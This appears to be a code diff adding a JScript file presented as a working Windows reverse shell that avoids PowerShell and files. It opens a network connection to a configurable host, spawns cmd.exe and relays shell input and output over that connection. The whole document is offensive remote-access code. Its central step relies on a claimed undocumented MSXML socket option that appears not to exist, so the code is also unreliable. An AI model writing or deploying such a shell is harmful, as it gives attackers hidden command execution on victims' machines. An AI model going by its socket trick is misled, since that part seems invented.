@@ -1,0 +1,70 @@
+// rev_connect.jse - Working reverse shell (NO PowerShell, NO files)
+(function () {
+    var host = "127.0.0.1";
+    var port = 8080;
+
+    try {
+        // 1. Use MSXML2.ServerXMLHTTP to open TCP
+        var xml = new ActiveXObject("MSXML2.ServerXMLHTTP");
+        xml.open("GET", "http://" + host + ":" + port + "/", false);
+        xml.setRequestHeader("Connection", "close");
+        xml.send();
+
+        // 2. Get raw socket via undocumented property
+        var socket = xml.getOption(4);  // WinHttpOption_Connect_Socket
+
+        if (!socket) throw "No socket";
+
+        // 3. Spawn cmd.exe
+        var shell = new ActiveXObject("WScript.Shell");
+        var proc = shell.Exec("cmd.exe");
+
+        // 4. ADODB.Stream for binary I/O
+        var outStream = new ActiveXObject("ADODB.Stream");
+        outStream.Type = 1; outStream.Open();
+
+        // 5. Helpers
+        function strToBytes(s) {
+            var a = [];
+            for (var i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255);
+            return a;
+        }
+        function bytesToStr(b) {
+            return String.fromCharCode.apply(null, new VBArray(b).toArray());
+        }
+
+        // 6. Main loop
+        while (true) {
+            try {
+                // --- cmd → network ---
+                var out = "";
+                try { while (!proc.StdOut.AtEndOfStream) out += proc.StdOut.ReadAll(); } catch(e) {}
+                try { while (!proc.StdErr.AtEndOfStream) out += proc.StdErr.ReadAll(); } catch(e) {}
+                if (out) {
+                    outStream.Position = 0;
+                    outStream.SetEOS();
+                    outStream.Write(new VBArray(strToBytes(out)).toArray());
+                    outStream.Position = 0;
+                    socket.Send(outStream.Read());
+                }
+
+                // --- network → cmd ---
+                if (socket.DataAvailable > 0) {
+                    var data = socket.Receive(socket.DataAvailable);
+                    var bytes = new VBArray(data).toArray();
+                    proc.StdIn.Write(bytesToStr(bytes));
+                }
+
+                WScript.Sleep(50);
+
+                try { proc.ExitCode; break; } catch(e) {}
+
+            } catch (e) { break; }
+        }
+    } catch (e) {
+        // Optional: WScript.Echo("Error: " + e.message);
+    } finally {
+        try { proc.Terminate(); } catch(e) {}
+        try { socket.Close(); } catch(e) {}
+    }
+})();
